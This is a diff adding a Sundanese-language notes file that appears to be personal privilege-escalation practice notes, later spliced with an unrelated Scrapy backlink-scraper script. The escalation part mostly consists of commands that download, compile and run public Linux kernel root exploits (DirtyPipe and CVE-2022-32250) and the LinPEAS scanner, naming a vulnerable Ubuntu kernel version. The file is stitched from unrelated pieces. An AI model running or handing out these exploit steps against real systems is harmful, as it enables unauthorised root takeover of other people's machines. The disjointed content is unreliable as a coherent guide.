@@ -1,0 +1,89 @@
+Mun hayang latihan privilege escalation, coba nyaring target ku:
+
+Kernel Exploit → Pariksa versi kernel, tuluy téang CVE anu cocok.
+Sudo Misconfig → Upami aya paréntah anu bisa dijalankeun tanpa sandi, éta bisa dijadikeun jalan.
+SUID Binary → Mun aya file SUID anu bisa disalahgunakeun, bisa di-exploit.
+
+Coba make LinPEAS atawa Linux Smart Enumeration (LSE) pikeun scanning:
+
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+Ieu bakal maluruh poténsi jalan pikeun root access. 🚀
+
+Tapi inget, latihan kudu di lingkungan anu aman jeung legal, Mang. 😆
+
+Mang, éta paréntah téh dipaké pikeun ngecek kerentanan (vulnerabilities) dina sistem Linux supaya urang bisa neangan jalan pikeun privilege escalation (ti user biasa jadi root). Ieu rincianna:
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+→ Ngundeur (download) script LinPEAS ti GitHub. LinPEAS téh alat pikeun nganalisa sistem jeung milarian poténsi jalan pikeun ngarebut hak aksés root.
+
+chmod +x linpeas.sh
+→ Ngabogaan hak aksés execute (ngajalankeun) kana file linpeas.sh, supaya bisa dieksekusi kaya aplikasi biasa.
+
+./linpeas.sh
+→ Ngajalankeun LinPEAS pikeun nyeken (scan) sistem. Ieu bakal:
+
+Ngecek kerentanan kernel
+Ngecek sudo permissions
+Ngecek file SUID anu bisa di-exploit
+Ngecek misconfigurations dina server
+Sanggeus dijalankeun, LinPEAS bakal masihan laporan ngeunaan naon waé poténsi eksploitasi anu bisa dipaké pikeun ningkatkeun hak aksés. 🚀
+
+
+
+🔥 (2) CVE-2022-0847 - DirtyPipe (Probable)
+
+wget https://haxx.in/files/dirtypipez.c
+
+gcc dirtypipez.c -o dirtypipe
+
+./dirtypipe
+
+🔥 (1) CVE-2022-32250 - Kernel Exploit (Highly Probable)
+
+Bisa jalan di Ubuntu 22.04 (kernel 5.15.0-27-generic)
+
+wget https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+
+gcc exp.c -o exploit
+
+
+./exploit
+
+
+/var/log/auth.log
+
+
+backlink_scraper.py
+
+
+import scrapy
+
+class BacklinkSpider(scrapy.Spider):
+    name = "backlink_spider"
+    start_urls = ["https://situs-sumber.com"]  # Situs anu bakal di-crawl
+
+    def parse(self, response):
+        for link in response.css("a::attr(href)").getall():
+            if "http" in link and "website-anjeun.com" in link:
+                yield {"backlink": link}
+
+
+
+Hayang nyimpen hasilna kana file? Pake paréntah ieu
+scrapy runspider backlink_scraper.py -o backlinks.json
+
+
+pip install scrapy
+scrapy startproject backlink_checker
+cd backlink_checker
+Simpen kode anu tadi di jero folder spiders/ dina file contona backlink_spider.py.
+cd backlink_checker/spiders
+nano backlink_spider.py
+cd ..
+scrapy crawl backlink_spider
+scrapy crawl backlink_spider -o hasil.json
+
